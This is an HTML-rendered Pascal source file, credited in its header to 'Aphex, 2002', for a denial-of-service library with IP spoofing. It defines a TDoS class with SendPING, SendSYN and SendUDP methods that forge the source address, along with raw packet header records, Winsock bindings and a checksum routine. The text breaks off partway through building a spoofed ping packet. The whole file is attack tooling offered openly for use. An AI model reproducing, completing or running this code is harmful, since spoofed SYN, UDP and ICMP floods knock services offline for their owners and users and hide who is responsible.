<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>DOS.PAS</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	color: #808080;
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">{
  DoS IP Spoofing Library by Aphex, 2002 
  unremote@knology.net
}</span><span class="sc0">

</span><span class="sc5">unit</span><span class="sc0"> </span><span class="sc11">DoS</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">interface</span><span class="sc0">

</span><span class="sc5">type</span><span class="sc0">
  </span><span class="sc11">TBufferArray</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">65535</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">TDoS</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">class</span><span class="sc10">(</span><span class="sc11">TObject</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc5">private</span><span class="sc0">
  </span><span class="sc5">public</span><span class="sc0">
    </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">SendPING</span><span class="sc10">(</span><span class="sc11">TargetIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourceIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">SendSYN</span><span class="sc10">(</span><span class="sc11">TargetIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">TargetPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourceIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourcePort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">SendUDP</span><span class="sc10">(</span><span class="sc11">TargetIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">TargetPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourceIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourcePort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">type</span><span class="sc0">
  </span><span class="sc11">iph</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">ip_verlen</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_tos</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_len</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_id</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_offset</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_ttl</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_protocol</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_checksum</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_saddr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">longword</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ip_daddr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">longword</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">icmph</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">ih_type</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ih_code</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ih_checksum</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ih_id</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ih_seq</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">tcph</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">th_sport</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_dport</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_seq</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">longword</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_ack</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">longword</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_len</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_flags</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_win</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_checksum</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">th_upr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">udph</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">uh_sport</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uh_dport</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uh_len</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uh_checksum</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">packed</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">sb1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sb2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sb3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sb4</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">char</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">sw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">packed</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">sw1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sw2</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TInAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0">
      </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ssb</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ssw</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">sw</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc4">2</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">saddr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">longint</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TSockAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0">
      </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sin_family</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sin_port</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sin_addr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TInAddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sin_zero</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">char</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sa_family</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sa_data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">13</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">char</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0"> 

  </span><span class="sc11">TWSAData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">ver</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hgh</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">dsc</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">256</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">char</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sys</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">128</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">char</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">skt</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">udp</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">ven</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PChar</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">sk</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">hs</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">cp</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">pchar</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">longint</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">sendto</span><span class="sc10">(</span><span class="sc11">sk</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">bf</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ln</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fl</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">ad</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">le</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">setsockopt</span><span class="sc10">(</span><span class="sc11">sk</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">lv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">op</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ov</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PChar</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ol</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">af</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">st</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">WSACleanup</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">WSAGetLastError</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">vr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">ws</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TWSAData</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">stdcall</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">const</span><span class="sc0">
 </span><span class="sc11">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">(</span><span class="sc5">not</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc5">implementation</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'htons'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'inet_addr'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'closesocket'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">sendto</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'sendto'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">setsockopt</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'setsockopt'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'socket'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">WSACleanup</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'WSACleanup'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">WSAGetLastError</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'WSAGetLastError'</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">external</span><span class="sc0"> </span><span class="sc7">'WS2_32.DLL'</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc7">'WSAStartup'</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">CheckSum</span><span class="sc10">(</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">):</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">type</span><span class="sc0">
  </span><span class="sc11">TWordArray</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">Array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">lSumm</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">LongWord</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">iLoop</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">iLoop</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">TWordArray</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">)[</span><span class="sc11">iLoop</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">inc</span><span class="sc10">(</span><span class="sc11">iLoop</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">word</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">(</span><span class="sc11">TWordArray</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">)[</span><span class="sc11">iLoop</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc5">shr</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">$FFFF</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lSumm</span><span class="sc0"> </span><span class="sc5">shr</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Result</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">(</span><span class="sc5">not</span><span class="sc0"> </span><span class="sc11">lSumm</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">PNGHeader</span><span class="sc10">(</span><span class="sc11">FromIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">FromPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ToIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ToPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TBufferArray</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Socket</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">ipHdr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">iph</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">icmpHdr</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">icmph</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc11">Byte</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">Value</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">pointer</span><span class="sc10">(</span><span class="sc11">integer</span><span class="sc10">(</span><span class="sc11">DataPointer</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Value</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">icmpHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">);</span><span class="sc0">
